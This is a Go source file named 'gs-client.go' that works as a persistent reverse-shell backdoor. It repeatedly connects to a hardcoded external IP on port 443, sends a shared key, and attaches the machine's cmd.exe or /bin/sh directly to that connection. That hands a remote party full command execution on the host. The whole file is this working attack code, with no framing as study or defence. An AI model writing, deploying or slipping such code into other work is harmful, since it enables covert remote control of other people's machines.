// === gs-client.go ===
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

const (
	relayHost = "154.18.239.136:443"
	sharedKey = "<SHARED_KEY_PLACEHOLDER>"
)

func decryptShellData(key, data []byte) []byte {
	block, _ := aes.NewCipher(key)
	iv := data[:aes.BlockSize]
	plaintext := make([]byte, len(data[aes.BlockSize:]))
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(plaintext, data[aes.BlockSize:])
	return plaintext
}

func main() {
	key, _ := hex.DecodeString(sharedKey)
	for {
		conn, err := net.Dial("tcp", relayHost)
		if err != nil {
			fmt.Println("Retrying...")
			time.Sleep(5 * time.Second)
			continue
		}
		fmt.Fprintf(conn, "ROLE:client\n")
		fmt.Fprintf(conn, "KEY:%s\n", sharedKey)
		runShell(conn)
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

func runShell(conn net.Conn) {
	var shell string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else {
		shell = "/bin/sh"
	}
	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
